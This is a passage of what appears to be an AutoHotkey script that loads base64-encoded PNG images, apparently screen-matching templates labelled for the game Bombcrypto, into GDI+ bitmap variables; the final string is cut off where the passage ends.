A_Args.PNG.Bombcrypto   := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HBombcrypto  := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.Rots         := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HRots        := Gdip_BitmapFromBase64(0,1,Data.PNG "EoAAABGCAYAAABrEgIKAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAABEdSURBVHhe7ZsJXNRlGseHmQEExfUAz9RYTTMtyw4vlIWycnXNIy8sydYE1zMrrzSP0sqj8KBst9S0Na9VcwvBawPNPLBQFMQ7BOUQDJFjjvfz2+d5//yZYfiLuAzg+nE+n99nmJl3/vN/v/N7nvd53vmje77fENzX7SVBvTNz3n2VoRKgVHL3VVLVDir49SCEhg7F10v/AnEmGOLsGE2djuwux7H4PVrHqkxVG6j1S5+TSjv6AsS1HyBy9kJYbkAIi4YExM2flHEkfo/6fq1jV4aqFNQLpKmTB0Ec9YXInEwArDYYVhOBKoC14DdYE/xgPfRAaZ3uAVGQIscJayEd402II77ymHxsrc90lqoM1IiRQRCnukBkbLTBYWXvgTVxHcy7XoM5rAby3zKicLZrac1UnjcvJC31gGVPO4grq8lpkRApc+Sxx4YMwYAhwzQ/v6KqdFC9BgzFlvBApMYvJzf8WgSIQsmcQ5MjV21qCuvnbjAvVlQwzRXiC/dSKphhRP6bNhVMJXAfe0JEPQ6ROh0i7xDEpU9xZHk79Oo/VPNcKqJKBfUinbA4Rt98ztcKIKuZwuYmueo9iO2NFf3UjMKH9O96EghDKHzfKOGxCuYakfaqDif8tZU3zQDrSjeIA03ouOSsiwRttYf8bK1z+l9VaaAGDA1C7A8hBMguD92gZHzCjyb1BETaCJtOdoTYS9C+8sTNCQRmhF7q6it6nAxwQeRjRqxtUKOU/t3EFXF+emSON8D0ITnxa3LYyXEQCd0Ru7wthaHzVsdKAcXf5lGGZMq0g7QeIp4AXR5YEhIrlRI8gSqcXwPn+rjg8JMu2PuQATtbGRHeyBML6tTCorq18G1D9xJaXt8T/2joIcee+bMLTPOKYP3aXsI6SrCc5Syng+L8II61tQHicLvxPTmpQ2lAqopAFcyqgV+66PBDU1fsILd8UMcL8wnShyR+TkubGrlhDbnrexp/prcLChe4UihSXmNYp56BWOXhlJzldFBbP3uWctIaG6jcCEqyfbWdpOoMLftFoHjym2nyH5ODGND6Ru6l4DhqXQN3CSvqQSPB0ktY0lnHyMEJnbD1vU6a53onciqoYCoBUuNX2CBxftICY6+EzjKZm7+tj+Qhemxr7IaFdWtKN7FbtMBoaSON/cLHQ4FFYZhDSV6sUcIwdac/gkdUzFVOA8UFn6yTCuJskK5TSSCTOYtKgvS/KXCOU1j8/AAEFZF8b93fFKYltXD6BZ0EpEoLSFlisOwu/puPlTubVsRwWhHPU/W/qW6FilKngZr6JuWZVFqe7d1U4m8CZcmDyPqAQi0A1n/5wLLBG2JrAxQu8cJvg/TY2Ny9QqDsdeRpF6QMc0HeJCOtso9AxLTH1NB+mudeHjkNFLcSwkTtRTEYFRQBstfNKOkq6+5GyJ/qioLZNWSd9POTenxSr5bTQO1sZqSFwQUZwTqYltehxjoQ4u81NM+9PHIKqA3LnlP6rmIHMRQ7J2mBim4ii8vccQbEdtbhK8ovi7xrIqxNI6x/tCXi+zaV2vNEA0T6asNwVGQLY7H48cEOesT/SYf8d6mAPURp4d